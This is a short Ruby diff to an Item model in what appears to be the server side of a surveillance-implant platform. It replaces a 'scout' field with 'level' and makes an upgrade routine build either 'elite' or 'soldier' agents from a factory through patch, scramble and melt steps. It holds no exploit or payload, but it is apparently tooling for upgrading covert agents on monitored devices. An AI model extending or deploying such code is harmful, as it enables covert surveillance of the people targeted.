@@ -52,7 +52,7 @@ class Item
   field :cs, type: String
 
   CHECKSUM_ARGUMENTS = [:_id, :name, :counter, :status, :_kind, :path]
-  AGENT_CHECKSUM_ARGUMENTS = [:instance, :type, :platform, :deleted, :uninstalled, :demo, :upgradable, :scout, :good]
+  AGENT_CHECKSUM_ARGUMENTS = [:instance, :type, :platform, :deleted, :uninstalled, :demo, :upgradable, :level, :good]
 
   # scopes
   scope :only_checksum_arguments, only(CHECKSUM_ARGUMENTS + AGENT_CHECKSUM_ARGUMENTS + [:cs])
@@ -431,18 +431,21 @@ class Item
   end
 
   def upgrade_scout(method)
-
-    #TODO: build elite or soldier
-
     factory = ::Item.where({_kind: 'factory', ident: self.ident}).first
     build = RCS::DB::Build.factory(self.platform.to_sym)
     build.load({'_id' => factory._id})
     build.unpack
     build.patch({'demo' => self.demo})
     build.scramble
-    build.melt({'bit64' => true, 'codec' => true, 'scout' => false})
 
-    add_upgrade('elite', File.join(build.tmpdir, 'output'))
+    case method
+      when :elite
+        build.melt({'bit64' => true, 'codec' => true, 'scout' => false})
+        add_upgrade('elite', File.join(build.tmpdir, 'output'))
+      when :soldier
+        build.melt({'soldier' => true})
+        add_upgrade('soldier', File.join(build.tmpdir, 'output'))
+    end
 
     build.clean
 
@@ -487,7 +490,7 @@ class Item
 
   def notify_callback
     # we are only interested if the properties changed are:
-    interesting = ['name', 'desc', 'status', 'instance', 'version', 'deleted', 'uninstalled', 'scout']
+    interesting = ['name', 'desc', 'status', 'instance', 'version', 'deleted', 'uninstalled', 'level']
     return if not interesting.collect {|k| changes.include? k}.inject(:|)
 
     RCS::DB::PushManager.instance.notify(self._kind, {item: self, action: 'modify'})
